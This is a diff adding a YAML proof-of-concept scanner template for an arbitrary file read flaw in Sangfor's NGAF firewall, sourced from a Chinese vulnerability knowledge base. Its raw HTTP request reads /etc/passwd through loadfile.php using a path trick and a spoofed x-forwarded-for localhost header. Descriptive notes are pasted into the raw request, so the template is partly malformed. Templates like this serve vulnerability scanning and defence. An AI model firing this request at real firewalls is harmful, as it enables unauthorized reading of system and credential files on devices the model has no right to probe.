@@ -1,0 +1,46 @@
+id: poc-fbam6ahae85dgbgg
+info:
+  name: 深信服下一代防火墙NGAF任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fbam6ahae85dgbgg'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fbam6ahae85dgbgg
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /svpn_html/loadfile.php?file=/etc/./passwd HTTP/1.1
+
+
+    Accept: */*
+
+
+    Connection: Keep-Alive
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    x-forwarded-for: 127.0.0.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?root)(?=.*?bin).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
